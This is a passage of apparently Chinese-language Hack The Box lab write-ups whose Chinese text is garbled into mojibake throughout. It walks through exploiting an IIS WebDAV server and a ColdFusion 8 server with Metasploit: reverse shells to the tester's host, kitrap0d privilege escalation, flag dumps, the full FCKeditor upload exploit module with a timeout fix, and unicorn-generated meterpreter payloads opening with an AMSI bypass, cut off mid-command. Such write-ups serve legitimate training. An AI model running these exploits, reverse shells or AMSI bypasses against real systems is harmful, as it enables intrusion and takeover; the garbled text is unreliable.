     The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Microsoft Windows Server 2003 R2 SP2 x86\n```\nè®¾ç½®å¥½ç›¸å…³çš„é…ç½®ï¼Œç„¶åæ‰§è¡Œ\n\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] Trying path length 3 to 60 ...\n[*] Sending stage (175174 bytes) to 10.10.10.14\n[*] Meterpreter session 2 opened (10.10.16.4:4444 -> 10.10.10.14:1031) at 2022-03-25 03:31:02 -0400\n\nmeterpreter > shell\n[-] Failed to spawn shell with thread impersonation. Retrying without it.\nProcess 2056 created.\nChannel 2 created.\nMicrosoft Windows [Version 5.2.3790]\n(C) Copyright 1985-2003 Microsoft Corp.\n\nc:\\windows\\system32\\inetsrv>whoami\nwhoami\nnt authority\\network service\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell ä¸è¿‡æƒé™å¾ˆä½\n\nä½¿ç”¨ background è¿”å›\n\n# æƒé™æå‡\nä½¿ç”¨ post/multi/recon/local\\_exploit\\_suggester è¿›è¡Œææƒè„šæœ¬æŸ¥è¯¢\n\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester\nmsf6 post(multi/recon/local_exploit_suggester) > show options \n\nModule options (post/multi/recon/local_exploit_suggester):\n\n   Name             Current Setting  Required  Description\n   ----             ---------------  --------  -----------\n   SESSION                           yes       The session to run this module on\n   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits\n\nmsf6 post(multi/recon/local_exploit_suggester) > set session 2\nsession => 2\n```\nè®¾ç½®å¥½ä»¥åï¼Œexploit æ‰§è¡Œ\n\n```bash\nmsf6 post(multi/recon/local_exploit_suggester) > exploit \n\n[*] 10.10.10.14 - Collecting local exploits for x86/windows...\n[*] 10.10.10.14 - 38 exploit checks are being tried...\n[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.\n[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.\n[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.\n[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.\n[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.\n[*] Post module execution completed\n```\nä»¥ä¸Šéƒ½æ˜¯å½“å‰æœºå™¨ä¸‹å¯èƒ½å¯ç”¨çš„ææƒæ¨¡å—\n\n```bash\nexploit/windows/local/ms10_015_kitrap0d\n```\næŒ¨ä¸ªå°è¯•åï¼Œéƒ½æ˜¯æç¤ºæ²¡æœ‰æƒé™ â€œExploit failed: Rex::Post::Meterpreter::RequestError stdapi\\_sys\\_config\\_getsid: Operation failed: Access is denied.â€\n\n```bash\nmeterpreter > getuid\n[-] stdapi_sys_config_getuid: Operation failed: Access is denied.\n```\nç›´æ¥ä½¿ç”¨ getuid å‘½ä»¤ä¹Ÿæ˜¯ä¸è¡Œçš„\n\n```bash\nmeterpreter > ps\n\nProcess List\n============\n\n PID   PPID  Name               Arch  Session  User                          Path\n ---   ----  ----               ----  -------  ----                          ----\n 0     0     [System Process]\n 4     0     System\n 272   4     smss.exe\n 320   272   csrss.exe\n 344   272   winlogon.exe\n 392   344   services.exe\n 404   344   lsass.exe\n 532   584   davcdata.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe\n 584   392   svchost.exe\n 668   392   svchost.exe\n 732   392   svchost.exe\n 772   392   svchost.exe\n 788   392   svchost.exe\n 924   392   spoolsv.exe\n 952   392   msdtc.exe\n 1072  392   cisvc.exe\n 1112  392   svchost.exe\n 1168  392   inetinfo.exe\n 1204  392   svchost.exe\n 1308  392   VGAuthService.exe\n 1380  392   vmtoolsd.exe\n 1484  392   svchost.exe\n 1588  392   svchost.exe\n 1768  392   dllhost.exe\n 1908  392   alg.exe\n 1936  584   wmiprvse.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n 2404  584   wmiprvse.exe\n 2604  344   logon.scr\n 2656  1484  w3wp.exe           x86   0        NT AUTHORITY\\NETWORK SERVICE  c:\\windows\\system32\\inetsrv\\w3wp.exe\n 3408  2656  rundll32.exe       x86   0                                      C:\\WINDOWS\\system32\\rundll32.exe\n 3892  1072  cidaemon.exe\n 3936  1072  cidaemon.exe\n 3972  1072  cidaemon.exe\n\nmeterpreter > migrate 1936\n[*] Migrating from 3408 to 1936...\n[*] Migration completed successfully.\n```\nå°è¯•ä¸€ä¸‹è¿›ç¨‹è¿ç§»\n\n```bash\nmeterpreter > getuid\nServer username: NT AUTHORITY\\NETWORK SERVICE\n```\nè¿›ç¨‹è¿ç§»åå¯ä»¥æ‰§è¡Œ getuid å‘½ä»¤\n\nå†å°è¯•ä¸€ä¸‹ææƒæ¨¡å— exploit/windows/local/ms10\\_015\\_kitrap0d\n\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > show options \n\nModule options (exploit/windows/local/ms10_015_kitrap0d):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     5555             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 2K SP4 - Windows 7 (x86)\n```\nç„¶åæ‰§è¡Œ\n\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:5555 \n[*] Launching notepad to host the exploit...\n[+] Process 408 launched.\n[*] Reflectively injecting the exploit DLL into 408...\n[*] Injecting exploit into 408 ...\n[*] Exploit injected. Injecting payload into 408...\n[*] Payload injected. Executing exploit...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (175174 bytes) to 10.10.10.14\n[*] Meterpreter session 2 opened (10.10.16.4:5555 -> 10.10.10.14:1031) at 2022-03-27 21:33:07 -0400\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\næˆåŠŸææƒåˆ° system æƒé™\n\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Documents and Settings\\Harry\\Desktop\\user.txt (32 bytes)\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes)\nmeterpreter > cat 'c:\\Documents and Settings\\Harry\\Desktop\\user.txt'\nbdff5ec67c3cff017f2bedc146a5d869\n\nmeterpreter > cat 'c:\\Documents and Settings\\Administrator\\Desktop\\root.txt'\n9359e905a2c35f861f6a57cecf28bb7b\n\nmeterpreter >\n```\næˆåŠŸæ‹¿åˆ° user å’Œ root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Arctic - Hackthebox","url":"/2022/03/25/Hackthebox/Easy/Hackthebox-Arctic/","content":"\n# Hackthebox - Arctic\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Arctic/e4c1173f-3f4c-4a90-9a78-925d46e5b127.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Arctic/6274ec95-fd32-4351-9439-13c674bfa6f5.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Arctic]\nâ””â”€# nmap -sC -sV -oA nmap 10.10.10.11                     \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-24 02:23 EDT\nNmap scan report for 10.10.10.11\nHost is up (0.35s latency).\nNot shown: 997 filtered ports\nPORT      STATE SERVICE VERSION\n135/tcp   open  msrpc   Microsoft Windows RPC\n8500/tcp  open  fmtp?\n49154/tcp open  msrpc   Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 252.28 seconds\n```\n## HTTP\nè¿™é‡Œçš„ 8500 æ˜¯ä¸€ä¸ª HTTP æœåŠ¡ï¼Œæ‰“å¼€åéœ€è¦ç­‰å¾…çº¦ 10-20 ç§’çš„æ—¶é—´æ¥åŠ è½½ã€‚è¿™å°é¶æœºçš„ç¿»è¯‘å«åšåŒ—æï¼Œæˆ‘æƒ³åŸå› å°±æ˜¯å› ä¸ºå¤ªæ…¢äº†å§ã€‚\n\n![](Hackthebox-Arctic/a1247cf5-7e0f-4a6e-82e3-8c4f4abd5102.png)\n\n![](Hackthebox-Arctic/6cd23f50-5a56-4ac7-87d9-5fa71e3d635c.png)\n\nåœ¨ CFIDE ç›®å½•ä¸‹æœ‰ä¸€ä¸ª administrator ç›®å½•ï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹\n\n![](Hackthebox-Arctic/1a24309f-23cb-4d09-bcf4-395cfa114edd.png)\n\nç„¶åå°±ä¼šè¿›å…¥ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œèµ«ç„¶å†™ç€ ColdFusion 8ï¼Œå» search ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´\n\n# æ¼æ´åˆ©ç”¨\n## SearchSploit\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Arctic]\nâ””â”€# searchsploit ColdFusion 8\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nAdobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                                               | cfm/webapps/36067.txt\nAdobe ColdFusion - Directory Traversal                                                                                                                                            | multiple/remote/14641.py\nAdobe ColdFusion - Directory Traversal (Metasploit)                                                                                                                               | multiple/remote/16985.rb\nAdobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                                                       | windows/remote/43993.py\nAdobe ColdFusion 2018 - Arbitrary File Upload                                                                                                                                     | multiple/webapps/45979.txt\nAdobe ColdFusion 9 - Administrative Authentication Bypass                                                                                                                         | windows/webapps/27755.txt\nAdobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                                                                   | multiple/webapps/40346.py\nAdobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                                                      | cfm/webapps/33170.txt\nAdobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                                                   | cfm/webapps/33167.txt\nAdobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                                                            | cfm/webapps/33169.txt\nAdobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                                                             | cfm/webapps/33168.txt\nAllaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                                                                                               | multiple/remote/19093.txt\nAllaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                                                                                                     | windows/local/19220.c\nColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                                                                 | cfm/webapps/16788.rb\nColdFusion 9-10 - Credential Disclosure                                                                                                                                           | multiple/webapps/25305.py\nColdFusion MX - Missing Template Cross-Site Scripting                                                                                                                             | cfm/remote/21548.txt\nColdFusion Scripts Red_Reservations - Database Disclosure                                                                                                                         | asp/webapps/7440.txt\nMacromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure                                                                                                         | multiple/remote/22867.pl\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)\n\nè¿™æ¡æ˜¾ç¤ºæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æœ‰ MSF è„šæœ¬ï¼Œå»è¿è¡Œè¯•è¯•\n\n## Msfconsole\n```bash\nmsf6 > search ColdFusion\n\nMatching Modules\n================\n\n   #  Name                                                           Disclosure Date  Rank       Check  Description\n   -  ----                                                           ---------------  ----       -----  -----------\n   0  exploit/multi/http/coldfusion_ckeditor_file_upload             2018-09-11       excellent  No     Adobe ColdFusion CKEditor unrestricted file upload\n   1  exploit/multi/http/coldfusion_rds_auth_bypass                  2013-08-08       great      Yes    Adobe ColdFusion RDS Authentication Bypass\n   2  auxiliary/scanner/http/adobe_xml_inject                                         normal     No     Adobe XML External Entity Injection\n   3  auxiliary/gather/coldfusion_pwd_props                          2013-05-07       normal     Yes    ColdFusion 'password.properties' Hash Extraction\n   4  exploit/windows/http/coldfusion_fckeditor                      2009-07-03       excellent  No     ColdFusion 8.0.1 Arbitrary File Upload and Execute\n   5  auxiliary/scanner/http/coldfusion_locale_traversal                              normal     No     ColdFusion Server Check\n   6  auxiliary/scanner/http/coldfusion_version                                       normal     No     ColdFusion Version Scanner\n   7  exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce  2016-03-28       excellent  Yes    HID discoveryd command_blink_on Unauthenticated RCE\n\nInteract with a module by name or index. For example info 7, use 7 or use exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce\n```\nç›´æ¥ä½¿ç”¨ç¬¬ä¸€ä¸ª ç„¶åå°è¯•æ˜¯å¦å¯ä»¥æˆåŠŸ\n\n```bash\nmsf6 > use 4\n[*] No payload configured, defaulting to generic/shell_reverse_tcp\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set payload generic/shell_reverse_tcp\npayload => generic/shell_reverse_tcp\n```\nä½¿ç”¨ç›¸å…³çš„æ¨¡å—ï¼Œå¹¶ä¸”è®¾ç½®å¥½æ”»å‡»æ¨¡å—\n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > show options \n\nModule options (exploit/windows/http/coldfusion_fckeditor):\n\n   Name           Current Setting                                                             Required  Description\n   ----           ---------------                                                             --------  -----------\n   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm\n   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          80                                                                          yes       The target port (TCP)\n   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections\n   VHOST                                                                                      no        HTTP server virtual host\n\nPayload options (generic/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.200.128  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Universal Windows Target\n```\nè¿™æ˜¯éœ€è¦è®¾ç½®çš„å‚æ•°\n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set rhosts 10.10.10.11\nrhosts => 10.10.10.11\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set rport 8500\nrport => 8500\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set lhost 10.10.16.4\nlhost => 10.10.16.4\nmsf6 exploit(windows/http/coldfusion_fckeditor) > show options \n\nModule options (exploit/windows/http/coldfusion_fckeditor):\n\n   Name           Current Setting                                                             Required  Description\n   ----           ---------------                                                             --------  -----------\n   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm\n   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS         10.10.10.11                                                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          8500                                                                        yes       The target port (TCP)\n   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections\n   VHOST                                                                                      no        HTTP server virtual host\n\nPayload options (generic/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Universal Windows Target\n```\nè®¾ç½®å¥½ç›¸å…³çš„å‚æ•°åï¼Œexploit æ‰§è¡Œ\n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] Sending our POST request...\n[-] Upload Failed...\n[*] Exploit completed, but no session was created.\n```\nè¿™ä¸ª exploit åœ¨æ‰§è¡Œåå‡ ä¹å°±ç§’å¤±è´¥äº†ï¼Œè¿™æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºè¿™ä¸ªç½‘ç«™ä¸ç®¡æ‰§è¡Œä»€ä¹ˆï¼Œéƒ½åº”è¯¥æœ‰ä¸ªå¤§çº¦ 30 ç§’å·¦å³çš„ç¼“å†²ï¼Œæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹åŸå› \n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > show advanced \n\nModule advanced options (exploit/windows/http/coldfusion_fckeditor):\n\n   Name                    Current Setting                                     Required  Description\n   ----                    ---------------                                     --------  -----------\n   ContextInformationFile                                                      no        The information file that contains context information\n   DOMAIN                  WORKSTATION                                         yes       The domain to use for Windows authentication\n   DigestAuthIIS           true                                                no        Conform to IIS, should work for most servers. Only set to false for non-IIS servers\n   DisablePayloadHandler   false                                               no        Disable the handler code for the selected payload\n   EnableContextEncoding   false                                               no        Use transient context when encoding payloads\n   FingerprintCheck        true                                                no        Conduct a pre-exploit fingerprint verification\n   HttpClientTimeout                                                           no        HTTP connection and receive timeout\n   HttpPassword                                                                no        The HTTP password to specify for authentication\n   HttpRawHeaders                                                              no        Path to ERB-templatized raw headers to append to existing headers\n   HttpTrace               false                                               no        Show the raw HTTP requests and responses\n   HttpTraceColors         red/blu                                             no        HTTP request and response colors for HttpTrace (unset to disable)\n   HttpTraceHeadersOnly    false                                               no        Show HTTP headers only in HttpTrace\n   HttpUsername                                                                no        The HTTP username to specify for authentication\n   SSLVersion              Auto                                                yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS\n                                                                                         1, TLS1.1, TLS1.2)\n   UserAgent               Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)  no        The User-Agent header to use for all requests\n   VERBOSE                 false                                               no        Enable detailed status messages\n   WORKSPACE                                                                   no        Specify the workspace for this module\n   WfsDelay                2                                                   no        Additional delay in seconds to wait for a session\n\nPayload advanced options (generic/shell_reverse_tcp):\n\n   Name                        Current Setting  Required  Description\n   ----                        ---------------  --------  -----------\n   ARCH                                         no        The architecture that is being targeted\n   PLATFORM                                     no        The platform that is being targeted\n   ReverseAllowProxy           false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST\n   ReverseListenerBindAddress                   no        The specific IP address to bind to on the local system\n   ReverseListenerBindPort                      no        The port to bind to on the local system if different from LPORT\n   ReverseListenerComm                          no        The specific communication channel to use for this listener\n   ReverseListenerThreaded     false            yes       Handle every connection in a new thread (experimental)\n   StagerRetryCount            10               no        The number of times the stager should retry if the first connect fails\n   StagerRetryWait             5                no        Number of seconds to wait for the stager between reconnect attempts\n   VERBOSE                     false            no        Enable detailed status messages\n   WORKSPACE                                    no        Specify the workspace for this module\n```\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set VERBOSE TRUE\nVERBOSE => true\n```\næˆ‘ä»¬å°† VERBOSE è®¾ç½®ä¸º TRUE ç„¶åå†æ‰§è¡Œ\n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] Sending our POST request...\n[-] Upload Failed...\n[*] Exploit completed, but no session was created.\n```\nç„¶åæ‰§è¡Œåè¿˜æ˜¯æ²¡æœ‰å¾—åˆ°ç›¸å…³çš„ä¿¡æ¯ï¼Œä»¥åŠè¯¦ç»†æƒ…å†µï¼Œæˆ‘ä»¬æŠ“ä¸ªåŒ…çœ‹çœ‹å†…å®¹\n\n![](Hackthebox-Arctic/7a23b53c-79ef-4988-9a40-5ffc890ffc0c.png)\n\n![](Hackthebox-Arctic/7aee663c-0163-4649-9031-826e2759afd8.png)\n\næ·»åŠ ä¸€ä¸ªæ–°çš„ä»£ç†ï¼Œè®¾ç½®ç«¯å£ä¸º 8500ï¼Œå¹¶å°†æµé‡è½¬å‘åˆ° 10.10.10.11çš„ 8500 ç«¯å£\n\n![](Hackthebox-Arctic/cb25197d-5eba-4baa-a0bb-daede99eefc4.png)\n\næˆ‘ä»¬åˆ‡æ¢å¥½ä»£ç†ï¼Œç„¶åå»æ‰§è¡Œ\n\n![](Hackthebox-Arctic/ff248858-b98f-49b8-9b4d-03613178cf7f.png)\n\næˆåŠŸæŠ“åˆ°äº† payload å†…å®¹\n\næˆ‘ä»¬å‘é€åˆ° repeaterï¼Œç„¶åæ‰§è¡Œ\n\n![](Hackthebox-Arctic/4b654c17-bc7a-4166-adc6-1ab740912926.png)\n\n![](Hackthebox-Arctic/37fc7ada-a333-4ba2-bed0-632eeacb8147.png)\n\nåœ¨ä¸‹é¢å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€æ®µå‘½ä»¤æ˜¯å‘æˆ‘ä»¬çš„ ip å’Œç«¯å£å›å¼¹ä¸€ä¸ªshellï¼Œä½†æ˜¯è¢«ä¸Šé¢çš„ 00 æˆªæ–­è¿˜æ˜¯ä»€ä¹ˆç©æ„å„¿çš„ç»™æˆªæ–­äº†è¿˜æ˜¯å§å•¦å§å•¦çš„ï¼Œåæ­£å°±æ˜¯æ²¡æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯æ–‡ä»¶åº”è¯¥ä¸Šå»äº†ã€‚åœ¨æœ¬åœ°ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç„¶åæ‰‹åŠ¨è®¿é—®ä¸€ä¸‹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\n```\n```bash\nhttp://10.10.10.11:8500/userfiles/file/MMJPPXXEPA.jsp\n```\nç„¶åç­‰å¾… 30 ç§’\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49440\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\ColdFusion8\\runtime\\bin>whoami\nwhoami\narctic\\tolis\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell\n\n```bash\nC:\\Users\\tolis\\Desktop>cd C:\\Users\\tolis\\Desktop\ncd C:\\Users\\tolis\\Desktop\n\nC:\\Users\\tolis\\Desktop>type user.txt\ntype user.txt\nb30ff1922f046d55ccb4b125ea8f1539\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶\n\n### Msf ä¿®å¤\næŸ¥æ‰¾ä¸€ä¸‹ windows/http/coldfusion\\_fckeditor çš„åœ°å€\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# locate windows/http/coldfusion_fckeditor                                                                                                                                                                    1 â¨¯\n/usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb\n```\næŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat /usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ColdFusion 8.0.1 Arbitrary File Upload and Execute',\n      'Description'    => %q{\n          This module exploits the Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload\n        and Execute vulnerability.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'win',\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'CVE', '2009-2265' ],\n          [ 'OSVDB', '55684'],\n        ],\n      'Targets'        =>\n        [\n          [ 'Universal Windows Target',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Payload'  =>\n                {\n                  'DisableNops' => true,\n                },\n            }\n          ],\n        ],\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe'\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-07-03'\n    ))\n\n    register_options(\n      [\n        OptString.new('FCKEDITOR_DIR', [ false, 'The path to upload.cfm ', '/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm' ]),\n      ])\n  end\n\n  def exploit\n\n    page  = rand_text_alpha_upper(rand(10) + 1) + \".jsp\"\n\n    dbl = Rex::MIME::Message.new\n    dbl.add_part(payload.encoded, \"application/x-java-archive\", nil, \"form-data; name=\\\"newfile\\\"; filename=\\\"#{rand_text_alpha_upper(8)}.txt\\\"\")\n    file = dbl.to_s\n    file.strip!\n\n    print_status(\"Sending our POST request...\")\n\n    res = send_request_cgi(\n      {\n        'uri'           => normalize_uri(datastore['FCKEDITOR_DIR']),\n        'query'         => \"Command=FileUpload&Type=File&CurrentFolder=/#{page}%00\",\n        'version'       => '1.1',\n        'method'        => 'POST',\n        'ctype'         => 'multipart/form-data; boundary=' + dbl.bound,\n        'data'          => file,\n      }, 5)\n\n    if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )\n      print_status(\"Upload succeeded! Executing payload...\")\n\n      send_request_raw(\n        {\n          # default path in Adobe ColdFusion 8.0.1.\n          'uri'         => '/userfiles/file/' + page,\n          'method'      => 'GET',\n        }, 5)\n\n      handler\n    else\n      print_error(\"Upload Failed...\")\n      return\n    end\n\n  end\nend\n```\nè¿™é‡Œå°† 74 è¡Œå’Œ 84 è¡Œçš„ç­‰å¾… 5 ç§’æ›´æ¢ä¸ºç­‰å¾… 25 ç§’å³å¯æˆåŠŸä½¿ç”¨\n\n# æƒé™æå‡\n## å¤±è´¥çš„æ–¹æ³•\n> [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)\n\nè¿™é‡Œä½¿ç”¨ unicorn å·¥å…·åå‘ä¸€ä¸ª Meterpreter çš„ shell å›æ¥\n\nä½¿ç”¨ unicorn ç”Ÿæˆä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn]\nâ””â”€# ./unicorn.py windows/meterpreter/reverse_tcp 10.10.16.4 5555\n```\nç„¶åä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn]\nâ””â”€# cat unicorn.rc \nuse multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 10.10.16.4\nset LPORT 5555\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n```\nä¸€ä¸ªæ˜¯åŠ è½½ç›‘å¬å™¨çš„æ‰€æœ‰å‘½ä»¤\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn]\nâ””â”€# cat powershell_attack.txt \n# AMSI bypass code - run in same process as unicorn second stage\npowershell /w 1 /C \"sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() 